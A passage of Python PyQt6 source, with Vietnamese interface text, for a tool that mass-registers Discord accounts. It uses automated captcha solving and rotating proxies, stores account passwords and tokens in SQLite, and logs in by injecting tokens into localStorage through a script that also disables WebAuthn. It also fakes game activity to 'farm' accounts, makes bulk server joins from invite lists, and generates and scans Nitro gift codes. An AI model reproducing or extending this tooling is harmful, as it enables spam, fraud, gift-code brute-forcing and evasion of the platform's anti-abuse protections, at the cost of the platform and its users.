                trang_thai TEXT
            )
        """)
        try:
            cursor.execute("ALTER TABLE accounts_v2 ADD COLUMN nitro TEXT")
        except:
            pass
        self.db_conn.commit()
        self.log("Đã kết nối cơ sở dữ liệu.", "INFO")

    def load_accounts_from_db(self):
        cursor = self.db_conn.cursor()
        cursor.execute("SELECT email, username, password, token, song_chet, trang_thai, nitro FROM accounts_v2")
        records = cursor.fetchall()
        
        self.table.blockSignals(True)
        for row in records:
            acc_data = {"email": row[0], "username": row[1], "password": row[2], "token": row[3]}
            sc = row[4] if row[4] in ["Sống", "Chết"] else "Sống"
            self.display_account_on_table(acc_data, sc, row[5], row[6] if len(row) > 6 and row[6] else "")
            self.account_list.append(acc_data)
        self.table.blockSignals(False)
        
        self.log(f"Đã tải {len(records)} tài khoản từ hệ thống.", "SUCCESS")
        self.refresh_discord_tabs()

    def apply_professional_theme(self):
        self.setStyleSheet("""
            QMainWindow, QDialog { background-color: #121212; }
            QWidget { font-family: 'Segoe UI', Arial, sans-serif; font-size: 10pt; color: #E0E0E0; }
            
            QTabWidget::pane { border: 1px solid #2A2A2A; border-radius: 6px; background-color: #1E1E1E; margin-top: -1px; }
            QTabBar::tab { background: #121212; color: #888888; padding: 12px 25px; border: 1px solid transparent; border-top-left-radius: 6px; border-top-right-radius: 6px; font-weight: 500; }
            QTabBar::tab:selected { background: #1E1E1E; color: #FFFFFF; border: 1px solid #2A2A2A; border-bottom: 1px solid #1E1E1E; border-top: 3px solid #3B82F6; font-weight: bold; }

            QLineEdit, QSpinBox, QComboBox, QTextEdit, QPlainTextEdit { background-color: #252526; border: 1px solid #3E3E42; color: #FFFFFF; padding: 8px 12px; border-radius: 4px; }
            QTextEdit[readOnly="true"], QPlainTextEdit[readOnly="true"] { background-color: #1A1A1A; color: #FFFFFF; border: 1px solid #333333; }
            QLineEdit:disabled, QSpinBox:disabled { background-color: #1A1A1A; color: #555555; }
            
            QComboBox::drop-down { border: none; width: 0px; }
            QComboBox::down-arrow { image: none; }
            QComboBox QAbstractItemView { background-color: #252526; border: 1px solid #3E3E42; selection-background-color: #3B82F6; color: #FFFFFF; }

            QPushButton { background-color: #333333; border: 1px solid #444444; color: #E0E0E0; padding: 9px 16px; border-radius: 4px; font-weight: bold; }
            QPushButton:disabled { background-color: #1A1A1A; color: #555555; border: 1px solid #222222; }
            QPushButton#btn_primary { background-color: #3B82F6; border: none; color: white; }
            QPushButton#btn_success { background-color: #10B981; border: none; color: white; }
            QPushButton#btn_warning { background-color: #F59E0B; border: none; color: white; }

            QTableView { outline: none; border: none; }
            QTableWidget { background-color: #1E1E1E; alternate-background-color: #252526; gridline-color: #333333; border: 1px solid #2A2A2A; border-radius: 6px; selection-background-color: transparent; outline: none; }
            QTableWidget::item { padding: 5px; border: none; outline: none; }
            QTableWidget::item:hover { background-color: transparent; border: none; outline: none; }
            QTableWidget::item:focus { background-color: transparent; border: none; outline: none; }
            QTableWidget::item:selected { background-color: transparent; border: none; outline: none; }
            QHeaderView::section { background-color: #252526; color: #FFFFFF; padding: 10px; border: none; border-bottom: 1px solid #333333; font-weight: bold; }
            
            QTableWidget QLineEdit { padding: 0px 5px; margin: 0px; background-color: #1A1A1A; color: #FFFFFF; border: 0px solid transparent; outline: none; }
            QTableWidget QLineEdit:focus { border: 0px solid transparent; outline: none; }
            
            QLabel { color: #A0A0A0; font-weight: 500; border: none; background: transparent; }
            #cfg_panel { background-color: #252526; border-radius: 8px; border: 1px solid #333; }
            #proxy_box { background-color: #1E1E1E; border: 1px solid #333; border-radius: 4px; }
            
            QScrollBar:vertical { width: 0px; background: transparent; }
            QScrollBar:horizontal { height: 0px; background: transparent; }
        """)

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)

        self.tabs = QTabWidget()
        
        self.tab_autoreg = QWidget()
        self.setup_autoreg_tab()
        self.tabs.addTab(self.tab_autoreg, "Tạo Tài Khoản")

        self.tab_manager = QWidget()
        self.setup_manager_tab()
        self.tabs.addTab(self.tab_manager, "Quản Lý")

        self.tab_discord = QWidget()
        self.setup_discord_tab()
        self.tabs.addTab(self.tab_discord, "Discord")
        
        self.tabs.currentChanged.connect(self.on_tab_changed)
        layout.addWidget(self.tabs) 

    def on_tab_changed(self, index):
        tab_name = self.tabs.tabText(index)
        self.log(f"Đã chuyển khu vực làm việc sang tab: [{tab_name.strip()}]", "INFO")

    def on_captcha_mode_changed(self, idx):
        is_auto = (idx == 0)
        self.cfg_api_key.setEnabled(is_auto)
        self.btn_api_file.setEnabled(is_auto)

    def on_proxy_mode_changed(self, idx):
        is_proxy = (idx == 1)
        self.cfg_proxy_file.setEnabled(is_proxy)
        self.btn_proxy_file.setEnabled(is_proxy)

    def setup_autoreg_tab(self):
        layout = QHBoxLayout(self.tab_autoreg)
        layout.setSpacing(25)
        layout.setContentsMargins(20, 20, 20, 20)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        
        cfg_panel = QFrame()
        cfg_panel.setObjectName("cfg_panel")
        
        cfg_layout = QVBoxLayout(cfg_panel)
        cfg_layout.setContentsMargins(20, 20, 20, 20)
        cfg_layout.setSpacing(12)

        title = QLabel("CẤU HÌNH")
        title.setStyleSheet("color: #FFFFFF; font-size: 11pt; font-weight: bold; margin-bottom: 5px;")
        cfg_layout.addWidget(title)

        row1 = QHBoxLayout()
        v1 = QVBoxLayout()
        v1.addWidget(QLabel("Số lượng tạo:"))
        self.cfg_count = QSpinBox()
        self.cfg_count.setButtonSymbols(QSpinBox.ButtonSymbols.NoButtons)
        self.cfg_count.setValue(5)
        self.cfg_count.setMaximum(1000)
        v1.addWidget(self.cfg_count)
        
        v2 = QVBoxLayout()
        v2.addWidget(QLabel("Thời gian hoãn:"))
        self.cfg_delay = QSpinBox()
        self.cfg_delay.setButtonSymbols(QSpinBox.ButtonSymbols.NoButtons)
        self.cfg_delay.setValue(90)
        self.cfg_delay.setMaximum(3600)
        v2.addWidget(self.cfg_delay)
        
        row1.addLayout(v1)
        row1.addLayout(v2)
        cfg_layout.addLayout(row1)

        cfg_layout.addWidget(QLabel("Quốc gia Random:"))
        self.cfg_country = QComboBox()
        self.cfg_country.addItems(list(NAMES_DB.keys()))
        cfg_layout.addWidget(self.cfg_country)

        cfg_layout.addWidget(QLabel("Tiền tố Username:"))
        self.cfg_prefix = QLineEdit("atk")
        cfg_layout.addWidget(self.cfg_prefix)

        cfg_layout.addWidget(QLabel("Nền tảng chạy:"))
        self.cfg_platform = QComboBox()
        self.cfg_platform.addItems(["Bằng Chrome", "Bằng LDPlayer9"])
        cfg_layout.addWidget(self.cfg_platform)

        cfg_layout.addWidget(QLabel("Cấu trúc mật khẩu:"))
        self.cfg_pass_mode = QComboBox()
        self.cfg_pass_mode.addItems(["Sử dụng mật khẩu cố định", "Sinh mật khẩu ngẫu nhiên"])
        cfg_layout.addWidget(self.cfg_pass_mode)
        self.cfg_custom_pass = QLineEdit("Atikoy!@#2026")
        cfg_layout.addWidget(self.cfg_custom_pass)

        cfg_layout.addWidget(QLabel("Chế độ giải Captcha:"))
        self.cfg_captcha_mode = QComboBox()
        self.cfg_captcha_mode.addItems(["Giải tự động bằng Anticaptcha", "Giải tay"])
        self.cfg_captcha_mode.currentIndexChanged.connect(self.on_captcha_mode_changed)
        cfg_layout.addWidget(self.cfg_captcha_mode)

        cfg_layout.addWidget(QLabel("API Key Anticaptcha:"))
        api_lay = QHBoxLayout()
        self.cfg_api_key = QLineEdit()
        self.cfg_api_key.setPlaceholderText("")
        self.btn_api_file = QPushButton("📂")
        self.btn_api_file.setFixedWidth(55)
        self.btn_api_file.clicked.connect(self.browse_api_file)
        
        api_lay.addWidget(self.cfg_api_key)
        api_lay.addWidget(self.btn_api_file)
        cfg_layout.addLayout(api_lay)

        cfg_layout.addWidget(QLabel("Tự động nuôi tài khoản:"))
        self.cfg_auto_farm = QComboBox()
        self.cfg_auto_farm.addItems(["Làm thủ công", "Tự động nuôi"])
        self.cfg_auto_farm.currentIndexChanged.connect(self.on_auto_farm_changed)
        cfg_layout.addWidget(self.cfg_auto_farm)

        row_check = QHBoxLayout()
        v_check1 = QVBoxLayout()
        v_check1.addWidget(QLabel("Kiểm tra token:"))
        self.cfg_auto_check = QComboBox()
        self.cfg_auto_check.addItems(["Làm thủ công", "Tự động kiểm tra"])
        self.cfg_auto_check.currentIndexChanged.connect(self.on_auto_check_changed)
        v_check1.addWidget(self.cfg_auto_check)

        v_check2 = QVBoxLayout()
        v_check2.addWidget(QLabel("Thời gian lặp:")) 
        self.cfg_check_interval = QSpinBox()
        self.cfg_check_interval.setButtonSymbols(QSpinBox.ButtonSymbols.NoButtons)
        self.cfg_check_interval.setRange(5, 86400)
        self.cfg_check_interval.setValue(20)
        self.cfg_check_interval.setEnabled(False)
        self.cfg_check_interval.valueChanged.connect(self.on_check_interval_changed)
        v_check2.addWidget(self.cfg_check_interval)
        
        row_check.addLayout(v_check1)
        row_check.addLayout(v_check2)
        cfg_layout.addLayout(row_check)

        proxy_group_box = QFrame()
        proxy_group_box.setObjectName("proxy_box")
        
        proxy_lay = QVBoxLayout(proxy_group_box)
        proxy_lay.setContentsMargins(15, 15, 15, 15)
        proxy_lay.setSpacing(10)

        self.cfg_proxy_mode = QComboBox()
        self.cfg_proxy_mode.addItems(["Không Dùng Proxy", "Dùng Proxy Random"])
        self.cfg_proxy_mode.currentIndexChanged.connect(self.on_proxy_mode_changed)
        proxy_lay.addWidget(self.cfg_proxy_mode)

        proxy_file_lay = QHBoxLayout()
        self.cfg_proxy_file = QLineEdit()
        self.cfg_proxy_file.setEnabled(False)
        self.cfg_proxy_file.setPlaceholderText("")
        self.btn_proxy_file = QPushButton("📂")
        self.btn_proxy_file.setFixedWidth(55)
        self.btn_proxy_file.setEnabled(False)
        self.btn_proxy_file.clicked.connect(self.browse_proxy_file)
        
        proxy_file_lay.addWidget(self.cfg_proxy_file)
        proxy_file_lay.addWidget(self.btn_proxy_file)
        proxy_lay.addLayout(proxy_file_lay)
        
        cfg_layout.addWidget(proxy_group_box)
        cfg_layout.addStretch()

        self.btn_start_reg = QPushButton("BẮT ĐẦU CHẠY")
        self.btn_start_reg.setObjectName("btn_primary")
        self.btn_start_reg.setMinimumHeight(45)
        self.btn_start_reg.clicked.connect(self.toggle_start_reg_action)
        cfg_layout.addWidget(self.btn_start_reg)

        scroll_area.setWidget(cfg_panel)
        layout.addWidget(scroll_area, stretch=4)

        terminal_container = QFrame()
        terminal_container.setObjectName("cfg_panel")
        term_layout = QVBoxLayout(terminal_container)
        term_layout.setContentsMargins(20, 20, 20, 20)
        term_layout.setSpacing(12)
        
        log_title = QLabel("NHẬT KÝ HOẠT ĐỘNG")
        log_title.setStyleSheet("color: #FFFFFF; font-size: 11pt; font-weight: bold; margin-bottom: 5px;")
        term_layout.addWidget(log_title)
        
        self.terminal_log = QTextEdit()
        self.terminal_log.setReadOnly(True)
        self.terminal_log.setStyleSheet("""
            QTextEdit {
                background-color: #0c0c0c;
                color: #cccccc;
                font-family: Consolas, 'Courier New', monospace;
                font-size: 10pt;
                border: 1px solid #222222;
                border-radius: 4px;
                padding: 10px;
            }
        """)
        term_layout.addWidget(self.terminal_log)
        layout.addWidget(terminal_container, stretch=6)

    def browse_api_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.cfg_api_key.setText(file_path)
            self.log(f"Đã trỏ tới file danh sách API Key: {file_path}", "SUCCESS")
            
    def browse_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.cfg_proxy_file.setText(file_path)
            self.log(f"Đã trỏ tới file Proxy: {file_path}", "SUCCESS")

    def setup_manager_tab(self):
        layout = QVBoxLayout(self.tab_manager)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)

        self.table = QTableWidget(0, 7)
        self.table.setWordWrap(False)
        self.table.setAlternatingRowColors(True)
        self.table.setSelectionMode(QTableWidget.SelectionMode.NoSelection)
        self.table.setFocusPolicy(Qt.FocusPolicy.NoFocus)
        self.table.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.table.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        
        self.table.verticalHeader().setVisible(False)
        self.table.verticalHeader().setDefaultSectionSize(45)
        
        self.table.setHorizontalHeaderLabels(["EMAIL", "USERNAME", "PASSWORD", "TOKEN", "SỐNG/CHẾT", "TRẠNG THÁI", "NITRO"])
        self.table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        self.table.horizontalHeader().setStretchLastSection(False)
        self.table.cellDoubleClicked.connect(self.on_table_double_click)
        
        layout.addWidget(self.table)
        self.table.itemChanged.connect(self.on_table_item_changed)

        ctrl_lay = QHBoxLayout()
        ctrl_lay.setSpacing(10)
        
        btn_check = QPushButton("KIỂM TRA TOKEN")
        btn_check.clicked.connect(self.check_all_tokens)

        btn_nitro = QPushButton("KIỂM TRA NITRO")
        btn_nitro.clicked.connect(self.start_nitro_check)

        self.btn_farm = QPushButton("TREO CHƠI GAME")
        self.btn_farm.setObjectName("btn_success")
        self.btn_farm.clicked.connect(self.toggle_farming)

        btn_add_acc = QPushButton("THÊM TÀI KHOẢN")
        btn_add_acc.clicked.connect(self.show_add_account_dialog)

        self.btn_join_srv = QPushButton("THAM GIA MÁY CHỦ")
        self.btn_join_srv.clicked.connect(self.show_join_server_dialog)

        btn_export = QPushButton("XUẤT FILE TXT")
        btn_export.clicked.connect(self.export_tokens)

        ctrl_lay.addWidget(btn_check)
        ctrl_lay.addWidget(btn_nitro)
        ctrl_lay.addWidget(self.btn_farm)
        ctrl_lay.addWidget(btn_add_acc)
        ctrl_lay.addWidget(self.btn_join_srv)
        ctrl_lay.addStretch()
        ctrl_lay.addWidget(btn_export)
        
        layout.addLayout(ctrl_lay)
        
    def setup_discord_tab(self):
        layout = QVBoxLayout(self.tab_discord)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)

        if not HAS_WEBENGINE:
            err_box = QLabel("Thư viện nhúng WebBrowser chưa được cài đặt!\nVui lòng mở Terminal/CMD và gõ lệnh: pip install PyQt6-WebEngine")
            err_box.setStyleSheet("color: #EF4444; font-size: 12pt; font-weight: bold;")
            err_box.setAlignment(Qt.AlignmentFlag.AlignCenter)
            layout.addWidget(err_box)
            return

        self.browser_tabs = QTabWidget()
        self.browser_tabs.setTabsClosable(True)
        self.browser_tabs.tabCloseRequested.connect(self.close_discord_tab)
        layout.addWidget(self.browser_tabs)

    def close_discord_tab(self, index):
        tab_title = self.browser_tabs.tabText(index).strip()
        self.browser_tabs.removeTab(index)
        self.log(f"Đã đóng thủ công tab Discord của User: {tab_title}", "WARNING")

    def log(self, text, level="INFO", overwrite=False):
        if not hasattr(self, 'terminal_log'):
            return

        t_str = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "#3B82F6",
            "SUCCESS": "#10B981",
            "ERROR": "#EF4444",
            "WARNING": "#F59E0B"
        }
        color = colors.get(level, "#CCCCCC")
        log_line = f'<span style="color: #6b7280;">[{t_str}]</span> <span style="color: {color}; font-weight: bold;">[{level}]</span> <span style="color: #e5e7eb;">{text}</span>'
        self.terminal_log.append(log_line)
        
        cursor = self.terminal_log.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        self.terminal_log.setTextCursor(cursor)

    def refresh_discord_tabs(self):
        if not HAS_WEBENGINE: return
        
        existing_usernames = []
        for i in range(self.browser_tabs.count()):
            existing_usernames.append(self.browser_tabs.tabText(i).strip())
            
        added_tabs = 0
        for i in range(self.table.rowCount()):
            username_item = self.table.item(i, 1)
            token_item = self.table.item(i, 3)
            status_item = self.table.item(i, 4)
            
            if not username_item or not token_item or not status_item: continue
            
            username = username_item.text().strip()
            token = token_item.text().strip()
            status = status_item.text().strip()
            
            if status == "Sống" and token and username not in existing_usernames:
                self.create_discord_browser_tab(username, token)
                added_tabs += 1
                
        if added_tabs > 0:
            self.log(f"Tiến trình Tự động đã mở & đăng nhập thêm {added_tabs} tab Discord.", "INFO")

    def create_discord_browser_tab(self, username, token):
        profile = QWebEngineProfile(f"Discord_{username}", self.browser_tabs)
        
        script = QWebEngineScript()
        script.setSourceCode(f"""
            window.PublicKeyCredential = undefined;
            if (window.navigator && window.navigator.credentials) {{
                window.navigator.credentials.get = function() {{ return new Promise(() => {{}}); }};
                window.navigator.credentials.create = function() {{ return new Promise(() => {{}}); }};
                window.navigator.credentials.getClientCapabilities = function() {{ return Promise.resolve({{}}); }};
            }}
            
            try {{ window.localStorage.setItem('token', `"{token}"`); }} catch(e) {{}}
        """)
        script.setInjectionPoint(QWebEngineScript.InjectionPoint.DocumentCreation)
        script.setWorldId(QWebEngineScript.ScriptWorldId.MainWorld)
        profile.scripts().insert(script)
        
        page = QuietWebEnginePage(profile, self.browser_tabs)
        browser = QWebEngineView()
        browser.setPage(page)
        browser.setProperty("discord_token", token)
        
        browser.setProperty("has_injected_token", False)
        
        def on_load_finished(ok):
            if ok and not browser.property("has_injected_token"):
                url = browser.url().toString()
                if "app" in url or "login" in url:
                    js_code = f"""
                    (function() {{
                        if (!window.localStorage.getItem('token')) {{
                            try {{
                                let iframe = document.createElement('iframe');
                                document.head.append(iframe);
                                iframe.contentWindow.localStorage.setItem('token', `"{token}"`);
                                iframe.remove();
                                location.reload();
                            }} catch(e) {{}}
                        }}
                    }})();
                    """
                    browser.page().runJavaScript(js_code)
                    browser.setProperty("has_injected_token", True)
                    self.log(f"[{username}] Tải ngầm giao diện Discord thành công!", "SUCCESS")
                
        browser.loadFinished.connect(on_load_finished)
        browser.setUrl(QUrl("https://discord.com/app"))
        self.browser_tabs.addTab(browser, f" {username} ")

    def display_account_on_table(self, acc_data, song_chet="", trang_thai="", nitro=""):
        row = self.table.rowCount()
        self.table.insertRow(row)
        
        for col, key in enumerate(['email', 'username', 'password', 'token']):
            val = acc_data.get(key, '')
            item = QTableWidgetItem(val)
            item.setData(Qt.ItemDataRole.UserRole, val) 
            self.table.setItem(row, col, item)

        sc_item = QTableWidgetItem(song_chet)
        sc_item.setFlags(sc_item.flags() & ~Qt.ItemFlag.ItemIsEditable)
        if song_chet == "Sống": sc_item.setForeground(Qt.GlobalColor.green)
        elif song_chet == "Chết": sc_item.setForeground(Qt.GlobalColor.red)
        self.table.setItem(row, 4, sc_item)
        
        tt_item = QTableWidgetItem(trang_thai)
        tt_item.setFlags(tt_item.flags() & ~Qt.ItemFlag.ItemIsEditable)
        self.table.setItem(row, 5, tt_item)

        nt_item = QTableWidgetItem(nitro)
        self.table.setItem(row, 6, nt_item)

    def on_table_item_changed(self, item):
        col = item.column()
        if col not in [0, 1, 2, 3, 6]: return
        
        new_val = item.text()
        old_val = item.data(Qt.ItemDataRole.UserRole)
        if new_val == old_val: return 
        
        row = item.row()
        email = self.table.item(row, 0).text()
        username = self.table.item(row, 1).text()
        password = self.table.item(row, 2).text()
        token = self.table.item(row, 3).text()
        nitro = self.table.item(row, 6).text() if self.table.item(row, 6) else ""
        original_token = self.table.item(row, 3).data(Qt.ItemDataRole.UserRole)
        
        cursor = self.db_conn.cursor()
        try:
            cursor.execute("UPDATE accounts_v2 SET email=?, username=?, password=?, token=?, nitro=? WHERE token=?",
                           (email, username, password, token, nitro, original_token))
            self.db_conn.commit()
            
            self.table.blockSignals(True)
            self.table.item(row, 0).setData(Qt.ItemDataRole.UserRole, email)
            self.table.item(row, 1).setData(Qt.ItemDataRole.UserRole, username)
            self.table.item(row, 2).setData(Qt.ItemDataRole.UserRole, password)
            self.table.item(row, 3).setData(Qt.ItemDataRole.UserRole, token)
            if self.table.item(row, 6):
                self.table.item(row, 6).setData(Qt.ItemDataRole.UserRole, nitro)
            self.table.blockSignals(False)
            self.log(f"Đã cập nhật thủ công dữ liệu tài khoản: {email}", "WARNING")
        except Exception as e:
            self.log(f"Lỗi cập nhật CSDL: {str(e)}", "ERROR")

    def on_table_double_click(self, row, col):
        if col == 6: 
            item = self.table.item(row, col)
            if item and item.text():
                QApplication.clipboard().setText(item.text())
                self.log(f"Đã copy link Nitro: {item.text()}", "SUCCESS")

    def start_farming_for_account(self, token, row_idx):
        for t in self.farmer_threads:
            if t.token == token and t.running:
                return
        game = random.choice(HOT_GAMES)
        farmer = DiscordFarmerThread(token, game)
        self.farmer_threads.append(farmer)
        farmer.start()
        
        self.table.blockSignals(True)
        item = self.table.item(row_idx, 5)
        if item: item.setText(game)
        self.table.blockSignals(False)

    def start_all_farming_if_needed(self):
        self.btn_farm.setText("DỪNG NUÔI")
        self.btn_farm.setObjectName("btn_warning")
        self.apply_professional_theme()
        
        for i in range(self.table.rowCount()):
            tk_item = self.table.item(i, 3)
            status_item = self.table.item(i, 4)
            if tk_item and tk_item.text() and (status_item and status_item.text() != "Chết"):
                self.start_farming_for_account(tk_item.text(), i)

    def add_new_account_logic(self, acc_data):
        self.account_list.append(acc_data)
        sc = "Sống"
        tt = ""
        
        cursor = self.db_conn.cursor()
        try:
            cursor.execute("INSERT INTO accounts_v2 (email, username, password, token, song_chet, trang_thai, nitro) VALUES (?, ?, ?, ?, ?, ?, ?)",
                           (acc_data.get('email', ''), acc_data.get('username', ''), 
                            acc_data.get('password', ''), acc_data.get('token', ''), sc, tt, ""))
            self.db_conn.commit()
            self.log(f"Đã lưu thành công User [{acc_data.get('username')}] vào Database.", "SUCCESS")
        except sqlite3.IntegrityError:
            pass 
        
        self.table.blockSignals(True)
        self.display_account_on_table(acc_data, sc, tt, "")
        self.table.blockSignals(False)
        
        if self.current_auto_farm:
            self.start_farming_for_account(acc_data.get('token'), self.table.rowCount() - 1)
            
        self.refresh_discord_tabs()

    def show_add_account_dialog(self):
        self.log("Đã mở trình điền Tài khoản thủ công.", "INFO")
        dialog = AddAccountDialog(self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            raw_data = dialog.get_data()
            if raw_data:
                lines = raw_data.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if not line: continue
                    parts = line.split('|')
                    if len(parts) >= 3:
                        self.add_new_account_logic({
                            "email": parts[0].strip(),
                            "username": parts[0].split('@')[0].strip(), 
                            "password": parts[1].strip(),
                            "token": parts[2].strip()
                        })

    def show_join_server_dialog(self):
        self.log("Đã mở trình tham gia Máy chủ.", "INFO")
        dialog = JoinServerDialog(self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            raw_data = dialog.get_data()
            if raw_data:
                invites = [line.strip() for line in raw_data.split('\n') if line.strip()]
                if not invites: return
                
                tokens = []
                for i in range(self.table.rowCount()):
                    token_item = self.table.item(i, 3)
                    status_item = self.table.item(i, 4)
                    if token_item and token_item.text() and status_item and status_item.text() == "Sống":
                        tokens.append(token_item.text().strip())
                        
                if not tokens:
                    self.log("Không có tài khoản nào trên hệ thống để thực hiện.", "ERROR")
                    return
                
                self.join_thread = JoinServerThread(tokens, invites)
                self.join_thread.log_signal.connect(self.log)
                self.join_thread.start()

    def on_auto_farm_changed(self, idx):
        self.current_auto_farm = (idx == 1)
        if self.current_auto_farm:
            self.log("Đã bật Tự động nuôi tài khoản.", "INFO")
            self.start_all_farming_if_needed()
        else:
            self.log("Đã tắt Tự động nuôi tài khoản.", "WARNING")
            for t in self.farmer_threads:
                t.stop()
                t.quit()
            self.farmer_threads.clear()
            self.btn_farm.setText("TREO CHƠI GAME")
            self.btn_farm.setObjectName("btn_success")
            self.apply_professional_theme()
            self.table.blockSignals(True)
            for i in range(self.table.rowCount()):
                item = self.table.item(i, 5)
                if item: item.setText("")
            self.table.blockSignals(False)

    def on_auto_check_changed(self, idx):
        if idx == 1:
            interval_ms = self.cfg_check_interval.value() * 1000
            self.auto_check_timer.start(interval_ms)
            self.log(f"Đã bật Tự động kiểm tra Token.", "INFO")
        else:
            self.auto_check_timer.stop()
            self.log("Đã tắt Tự động kiểm tra Token.", "WARNING")

    def on_check_interval_changed(self, val):
        if self.cfg_auto_check.currentIndex() == 1:
            self.auto_check_timer.start(val * 1000)
            self.log(f"Đã cập nhật chu kỳ Tự động kiểm tra Token thành {val}s.", "INFO")

    def on_auto_reg_finished(self):
        self.btn_start_reg.setEnabled(True)
        self.btn_start_reg.setObjectName("btn_primary")
        self.btn_start_reg.setText("BẮT ĐẦU CHẠY")
        self.apply_professional_theme()
        self.log("HOÀN TẤT TOÀN BỘ QUY TRÌNH TẠO TÀI KHOẢN!", "SUCCESS")

    def toggle_start_reg_action(self):
        if self.reg_thread and self.reg_thread.isRunning():
            self.log("Đang gửi tín hiệu dừng luồng tạo tài khoản...", "WARNING")
            self.reg_thread.stop()
            self.btn_start_reg.setEnabled(False)
            self.btn_start_reg.setText("ĐANG DỪNG...")
            return

        proxies_list = []
        if self.cfg_proxy_mode.currentIndex() == 1:
            proxy_input = self.cfg_proxy_file.text().strip()
            if os.path.isfile(proxy_input):
                try:
                    with open(proxy_input, "r", encoding="utf-8") as f:
                        proxies_list = [line.strip() for line in f if line.strip()]
                except Exception as e:
                    self.log(f"Lỗi đọc file Proxy: {str(e)}", "ERROR")
                    return
            else:
                self.log("Lỗi: File Proxy không hợp lệ hoặc không tồn tại!", "ERROR")
                return

            if not proxies_list:
                self.log("Lỗi: Danh sách Proxy bị trống!", "ERROR")
                return

        captcha_mode = self.cfg_captcha_mode.currentIndex() 
        api_keys = []
        
        if captcha_mode == 0:
            api_input = self.cfg_api_key.text().strip()
            
            if os.path.isfile(api_input):
                try:
                    with open(api_input, "r", encoding="utf-8") as f:
                        api_keys = [line.strip() for line in f if line.strip()]
                except Exception as e:
                    self.log(f"Lỗi đọc file API Key: {str(e)}", "ERROR")
                    return
            elif api_input:
                api_keys = [api_input]
                
            if not api_keys:
                self.log("Lỗi: Chế độ giải Tự động yêu cầu cấu hình API Key hoặc chọn file!", "ERROR")
                return

        cfg = {
            "count": self.cfg_count.value(),
            "delay": self.cfg_delay.value(),
            "country": self.cfg_country.currentText(),
            "prefix": self.cfg_prefix.text().strip(),
            "platform": self.cfg_platform.currentIndex(),
            "pass_mode": "random" if self.cfg_pass_mode.currentIndex() == 1 else "custom",
            "custom_pass": self.cfg_custom_pass.text().strip(),
            "use_proxy": self.cfg_proxy_mode.currentIndex() == 1,
            "proxies": proxies_list,
            "captcha_mode": captcha_mode,
            "anticaptcha_keys": api_keys
        }
        
        self.btn_start_reg.setObjectName("btn_warning")
        self.btn_start_reg.setText("DỪNG CHẠY")
        self.apply_professional_theme()
        
        self.log(f"Bắt đầu quy trình Reg tự động {cfg['count']} tài khoản...", "INFO")
        
        self.reg_thread = AutoRegThread(cfg)
        self.reg_thread.log_signal.connect(self.log)
        self.reg_thread.acc_created_signal.connect(self.add_new_account_logic)
        self.reg_thread.finished_signal.connect(self.on_auto_reg_finished)
        self.reg_thread.start()

    def safe_check_all_tokens(self):
        if hasattr(self, 'checker_thread') and self.checker_thread.isRunning():
            return
        self.log("Bộ đếm thời gian: Tự động chạy lệnh quét Token...", "INFO")
        self.check_all_tokens()

    def check_all_tokens(self):
        for i in range(self.table.rowCount() - 1, -1, -1):
            if self.table.cellWidget(i, 0) is not None:
                self.table.removeRow(i)

        tokens = [self.table.item(i, 3).text() for i in range(self.table.rowCount()) if self.table.item(i, 3) and self.table.item(i, 3).text()]
        if not tokens: 
            self.log("Không có tài khoản nào trong hệ thống để kiểm tra.", "WARNING")
            return
            
        self.log(f"Bắt đầu tiến trình kiểm tra {len(tokens)} Token trên hệ thống...", "INFO")
        
        self.checker_thread = TokenCheckerThread(tokens)
        self.checker_thread.progress_signal.connect(self.update_token_status)
        self.checker_thread.finished_signal.connect(self.cleanup_dead_accounts)
        self.checker_thread.start()

    def start_nitro_check(self):
        if hasattr(self, 'nitro_thread') and self.nitro_thread.isRunning():
            self.log("Đang gửi lệnh dừng tiến trình quét Nitro...", "WARNING")
            self.nitro_thread.stop()
            return
            
        count, ok = QInputDialog.getInt(self, "Kiểm tra Nitro", "", 100, 1, 100000)
        if ok and count > 0:
            self.log(f"Bắt đầu tiến trình tạo và quét {count} mã Nitro...", "INFO")
            self.nitro_thread = NitroGenThread(count)
            self.nitro_thread.log_signal.connect(self.log)
            self.nitro_thread.found_nitro.connect(self.add_nitro_to_table)
            self.nitro_thread.finished_signal.connect(lambda: self.log("Hoàn tất tiến trình quét Nitro!", "SUCCESS"))
            self.nitro_thread.start()

    def add_nitro_to_table(self, url):
        for i in range(self.table.rowCount()):
            token_item = self.table.item(i, 3)
            if not token_item or not token_item.text(): continue
            
            nitro_item = self.table.item(i, 6)
            if not nitro_item or not nitro_item.text().strip():
                new_item = QTableWidgetItem(url)
                self.table.setItem(i, 6, new_item)
                
                token = token_item.text()
                cursor = self.db_conn.cursor()
                cursor.execute("UPDATE accounts_v2 SET nitro=? WHERE token=?", (url, token))
                self.db_conn.commit()
                return
        self.log(f"Đã tìm thấy Nitro nhưng không có tài khoản nào trống để lưu: {url}", "SUCCESS")

    def create_detail_widget(self, data):
        frame = QFrame()
        frame.setStyleSheet("""
            QFrame { border: 1px dashed #6b21a8; border-radius: 6px; background-color: #0f0a14; }
            QLabel { border: none; background: transparent; color: #E0E0E0; font-family: Consolas, monospace; font-size: 10pt; }
        """)
        layout = QHBoxLayout(frame)
        layout.setContentsMargins(20, 15, 20, 15)
        
        col1 = QVBoxLayout()
        col2 = QVBoxLayout()
        col1.setSpacing(10)
        col2.setSpacing(10)
